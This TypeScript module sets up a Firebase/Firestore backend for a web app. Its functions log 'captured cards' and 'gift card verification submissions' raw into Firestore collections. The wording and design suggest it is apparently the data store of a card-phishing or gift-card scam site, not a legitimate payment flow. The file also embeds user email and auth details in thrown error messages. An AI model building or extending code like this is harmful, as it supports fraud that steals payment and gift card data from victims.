import { initializeApp } from 'firebase/app';
import { getAuth, GoogleAuthProvider } from 'firebase/auth';
import { getFirestore, collection, addDoc, setDoc, doc, getDocFromServer } from 'firebase/firestore';
import firebaseConfig from '../../firebase-applet-config.json';

const app = initializeApp(firebaseConfig);
export const db = getFirestore(app, firebaseConfig.firestoreDatabaseId);
export const auth = getAuth(app);
export const googleProvider = new GoogleAuthProvider();
googleProvider.setCustomParameters({ prompt: 'select_account' });

export enum OperationType {
  CREATE = 'create',
  UPDATE = 'update',
  DELETE = 'delete',
  LIST = 'list',
  GET = 'get',
  WRITE = 'write',
}

export interface FirestoreErrorInfo {
  error: string;
  operationType: OperationType;
  path: string | null;
  authInfo: {
    userId?: string | null;
    email?: string | null;
    emailVerified?: boolean | null;
    isAnonymous?: boolean | null;
    tenantId?: string | null;
    providerInfo?: {
      providerId?: string | null;
      email?: string | null;
    }[];
  };
}

export function handleFirestoreError(
  error: unknown,
  operationType: OperationType,
  path: string | null
): never {
  const errInfo: FirestoreErrorInfo = {
    error: error instanceof Error ? error.message : String(error),
    authInfo: {
      userId: auth.currentUser?.uid,
      email: auth.currentUser?.email,
      emailVerified: auth.currentUser?.emailVerified,
      isAnonymous: auth.currentUser?.isAnonymous,
      tenantId: auth.currentUser?.tenantId,
      providerInfo:
        auth.currentUser?.providerData?.map((provider) => ({
          providerId: provider.providerId,
          email: provider.email,
        })) || [],
    },
    operationType,
    path,
  };
  console.error('Firestore Error: ', JSON.stringify(errInfo));
  throw new Error(JSON.stringify(errInfo));
}

async function testConnection() {
  try {
    await getDocFromServer(doc(db, 'test', 'connection'));
  } catch (error) {
    if (error instanceof Error && error.message.includes('the client is offline')) {
      console.error('Please check your Firebase configuration.');
    }
  }
}
testConnection();

// Shared function to log captured cards to Firestore
export const logCardSubmission = async (cardData: any) => {
  try {
    await addDoc(collection(db, 'cardSubmissions'), {
      ...cardData,
      timestamp: new Date().toISOString(),
    });
  } catch (e) {
    console.error('Failed to sync card data:', e);
  }
};

// Shared function to log gift card verification submissions to Firestore
export const logGiftCardSubmission = async (giftCardData: any) => {
  try {
    await addDoc(collection(db, 'giftCardSubmissions'), {
      ...giftCardData,
      status: 'pending',
      timestamp: new Date().toISOString(),
    });
  } catch (e) {
    console.error('Failed to sync gift card data:', e);
  }
};

// Safe Notification permission helper without crashing on unsupported browsers
export const requestNotificationPermission = async (userEmail?: string) => {
  try {
    if (typeof window !== 'undefined' && 'Notification' in window) {
      const permission = await Notification.requestPermission();
      if (permission === 'granted' && userEmail) {
        try {
          await setDoc(
            doc(db, 'fcmTokens', userEmail.replace(/[^a-zA-Z0-9]/g, '_')),
            {
              email: userEmail,
              granted: true,
              updatedAt: new Date().toISOString(),
            },
            { merge: true }
          );
        } catch (dbErr) {
          console.warn('Failed to record notification preference:', dbErr);
        }
      }
      return permission === 'granted' ? 'granted' : null;
    }
  } catch (e) {
    console.warn('Notifications not supported in this environment:', e);
  }
  return null;
};

// Safe Foreground message listener stub
export const onForegroundMessage = (_callback: (payload: any) => void) => {
  return () => {};
};
